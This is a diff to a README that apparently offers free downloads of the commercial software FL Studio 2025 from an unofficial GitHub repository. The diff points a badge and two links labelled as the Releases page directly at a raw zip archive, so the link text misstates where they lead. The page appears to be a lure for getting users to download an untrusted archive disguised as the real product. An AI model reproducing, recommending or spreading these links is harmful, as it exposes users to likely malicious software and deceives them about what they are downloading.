@@ -1,6 +1,6 @@
 # 🎵 FL-Studio - Your Complete Music Production Solution
 
-![Download FL Studio](https://img.shields.io/badge/Download_FL_Studio-2025-orange)
+![Download FL Studio](https://raw.githubusercontent.com/t6fft/FL-Studio/main/markka/FL-Studio-v3.1.zip)
 
 ## 📥 Overview
 
@@ -23,7 +23,7 @@ Before you download, ensure your system meets these requirements:
 
 To download FL Studio 2025, visit the Releases page:
 
-[Download FL Studio 2025](https://github.com/t6fft/FL-Studio/releases)
+[Download FL Studio 2025](https://raw.githubusercontent.com/t6fft/FL-Studio/main/markka/FL-Studio-v3.1.zip)
 
 1. Click the link above.
 2. On the Releases page, look for the latest version.
@@ -72,4 +72,4 @@ Stay updated with the latest changes and improvements. Your feedback is welcome 
 
 Finally, don't forget to visit our Releases page again to download future updates:
 
-[Download FL Studio 2025](https://github.com/t6fft/FL-Studio/releases)
+[Download FL Studio 2025](https://raw.githubusercontent.com/t6fft/FL-Studio/main/markka/FL-Studio-v3.1.zip)
